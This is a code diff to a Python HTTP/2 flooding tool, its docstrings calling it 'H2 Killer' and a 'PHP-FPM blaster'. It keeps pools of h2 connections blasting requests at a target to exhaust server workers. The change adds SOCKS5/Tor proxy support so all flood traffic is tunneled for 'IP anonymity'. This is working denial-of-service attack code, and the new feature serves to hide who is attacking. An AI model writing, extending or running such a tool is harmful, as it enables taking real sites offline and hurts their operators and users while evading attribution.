@@ -78,11 +78,13 @@ class FloodMetrics:
 
 
 class H2Blaster:
-    """Single h2 connection with blast + drain cycle for max throughput."""
+    """Single h2 connection with blast + drain cycle for max throughput.
+    Supports optional SOCKS5 proxy for IP anonymity (Tor, SOCKS5 proxies).
+    """
     __slots__ = ("host", "port", "host_header", "conn", "ssl_sock",
-                 "alive", "next_id")
+                 "alive", "next_id", "proxy_url")
 
-    def __init__(self, host: str, port: int, host_header: str = ""):
+    def __init__(self, host: str, port: int, host_header: str = "", proxy_url: str = ""):
         self.host = host
         self.port = port
         self.host_header = host_header or host
@@ -90,6 +92,23 @@ class H2Blaster:
         self.ssl_sock: Optional[ssl.SSLSocket] = None
         self.alive = False
         self.next_id = 1
+        self.proxy_url = proxy_url
+
+    def _make_socket(self, timeout: float):
+        """Create TCP socket, optionally through SOCKS5 proxy."""
+        if self.proxy_url:
+            import socks
+            from urllib.parse import urlparse
+            p = urlparse(self.proxy_url)
+            proxy_host = p.hostname or "127.0.0.1"
+            proxy_port = p.port or 9050
+            sock = socks.socksocket()
+            sock.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
+            sock.settimeout(timeout)
+            return sock
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        return sock
 
     def open(self, timeout: float = 6.0) -> bool:
         try:
@@ -99,9 +118,8 @@ class H2Blaster:
             ctx.set_alpn_protocols(["h2", "http/1.1"])
             ctx.set_ciphers("HIGH:!aNULL:!MD5")
 
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock = self._make_socket(timeout)
             sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            sock.settimeout(timeout)
             sock.connect((self.host, self.port))
 
             ssl_sock = ctx.wrap_socket(sock, server_hostname=self.host_header)
@@ -301,9 +319,13 @@ def run_h2_exhaust(
     target_url: str, rps: int, duration: float, worker_id: int,
     stats_queue, stop_event, host_header: str = "",
     connections: int = 4, result_dict: dict = None,
+    proxy_url: str = "",
 ) -> None:
     """
-    H2 Killer v3 — PHP-FPM blaster.
+    H2 Exhaust v3 — PHP-FPM blaster with optional SOCKS5 proxy support.
+    
+    When proxy_url is set (e.g. socks5://127.0.0.1:9050), all H2 connections
+    are tunneled through the SOCKS5 proxy for IP anonymity.
     
     Cycle: blast → drain → blast → drain (keep connections alive).
     Only reconnect when a connection truly dies.
@@ -358,7 +380,7 @@ def run_h2_exhaust(
             # Maintain pool
             pool = [c for c in pool if c.alive]
             while len(pool) < conn_max:
-                c = H2Blaster(host, port, hdr)
+                c = H2Blaster(host, port, hdr, proxy_url)
                 if c.open():
                     pool.append(c)
                 else:
